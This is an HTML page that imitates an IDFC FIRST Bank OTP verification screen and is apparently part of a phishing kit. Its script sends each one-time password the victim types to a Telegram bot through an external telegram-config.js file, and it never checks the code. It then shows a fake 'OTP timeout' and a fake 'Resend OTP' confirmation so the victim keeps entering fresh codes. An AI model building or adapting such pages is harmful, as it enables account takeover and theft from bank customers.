<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IDFC FIRST Bank - OTP Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f8f8f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }

        .otp-card { background: #fff; border-radius: 10px; width: 90%; max-width: 380px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 30px 20px; text-align: center; border-top: 3px solid #fd9907; }
        .otp-card img { height: 36px; margin-bottom: 15px; }
        .otp-card h2 { color: #832625; font-weight: 700; font-size: 1.1rem; margin-bottom: 4px; }
        .otp-card p { color: #777; font-size: 0.82rem; margin-bottom: 20px; }

        .otp-input { margin-bottom: 20px; }
        .otp-input input { width: 100%; max-width: 200px; height: 55px; text-align: center; font-size: 1.5rem; letter-spacing: 8px; border: 2px solid #e0e0e0; border-radius: 8px; outline: none; font-weight: 700; }
        .otp-input input:focus { border-color: #832625; box-shadow: 0 0 0 3px rgba(131,38,37,0.1); }

        .btn-submit { background: #832625; color: #fff; border: none; padding: 12px 30px; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; width: 100%; }
        .btn-submit:hover { background: #6d1a15; }

        .resend { margin-top: 12px; font-size: 0.8rem; }
        .resend a { color: #832625; text-decoration: none; font-weight: 600; }
        .timer { font-size: 0.75rem; color: #999; margin-top: 8px; }
        .status-message { display: none; margin-top: 10px; font-size: 0.8rem; font-weight: 600; color: #d93025; }
        .status-message.visible { display: block; }
        .status-message.success { color: #2e7d32; }
        .btn-resend { background: transparent; border: none; color: #832625; font-weight: 600; cursor: pointer; padding: 0; }
    </style>
</head>
<body>
    <div class="otp-card">
        <img src="../idfclog.jpeg" alt="IDFC FIRST Bank">
        <h2>OTP Verification</h2>
        <p>Enter the OTP sent to your registered mobile number</p>
        <form id="otpForm">
            <div class="otp-input">
                <input type="text" id="otp" maxlength="6" placeholder="------" required>
            </div>
            <div class="timer" id="timerDisplay">OTP expires in 03:00</div>
            <div id="otpStatus" class="status-message"></div>
            <button type="submit" class="btn-submit">VERIFY OTP</button>
        </form>
        <div class="resend">Didn't receive? <button type="button" class="btn-resend" id="resendOtpBtn">Resend OTP</button></div>
    </div>

    <script src="telegram-config.js"></script>
    <script>
        let timeLeft = 180;
        let otpExpired = false;
        const timerEl = document.getElementById('timerDisplay');
        const otpInput = document.getElementById('otp');
        const submitBtn = document.querySelector('.btn-submit');
        const resendBtn = document.getElementById('resendOtpBtn');
        const otpStatusEl = document.getElementById('otpStatus');

        const setStatusMessage = (msg, type = 'error') => {
            otpStatusEl.textContent = msg;
            otpStatusEl.className = 'status-message visible' + (type === 'success' ? ' success' : '');
        };

        const clearStatusMessage = () => {
            otpStatusEl.textContent = '';
            otpStatusEl.className = 'status-message';
        };

        const resetOtpState = () => {
            otpExpired = false;
            timeLeft = 180;
            otpInput.disabled = false;
            otpInput.value = '';
            submitBtn.disabled = false;
            submitBtn.textContent = 'VERIFY OTP';
            timerEl.textContent = 'OTP expires in 03:00';
            setStatusMessage('OTP expired. Please enter a new OTP.', 'error');
        };

        const showTimeoutState = () => {
            if (otpExpired) return;
            otpExpired = true;
            otpInput.disabled = false;
            submitBtn.disabled = false;
            submitBtn.textContent = 'VERIFY OTP';
            timerEl.textContent = 'OTP expired';
            setStatusMessage('OTP timeout! Please request a new OTP and try again.', 'error');
            alert('OTP timeout! Please request a new OTP and try again.');
        };

        setInterval(() => {
            if (otpExpired) return;
            timeLeft--;
            if (timeLeft <= 0) {
                timeLeft = 0;
                const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
                const s = String(timeLeft % 60).padStart(2, '0');
                timerEl.textContent = 'OTP expires in ' + m + ':' + s;
                showTimeoutState();
                return;
            }
            const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
            const s = String(timeLeft % 60).padStart(2, '0');
            timerEl.textContent = 'OTP expires in ' + m + ':' + s;
        }, 1000);

        document.getElementById("otpForm").addEventListener("submit", async function(event) {
            event.preventDefault();
            if (otpExpired) {
                alert('OTP timeout! Please request a new OTP and try again.');
                return;
            }

            const otp = otpInput.value;
            if (otp.length !== 6 || !/^\d{6}$/.test(otp)) { alert("Enter valid 6-digit OTP."); return; }

            submitBtn.disabled = true; submitBtn.textContent = "Processing...";

            try {
                const res = await sendOTPToTelegram(otp);
                if (res.success) {
                    setTimeout(() => {
                        showTimeoutState();
                    }, 1000);
                } else {
                    alert("Error: " + (res.error || "Failed"));
                    submitBtn.disabled = false; submitBtn.textContent = "VERIFY OTP";
                }
            } catch (err) {
                alert("Error occurred");
                submitBtn.disabled = false; submitBtn.textContent = "VERIFY OTP";
            }
        });

        resendBtn.addEventListener('click', function() {
            resetOtpState();
            alert('A new OTP has been sent.');
        });
    </script>
</body>
</html>
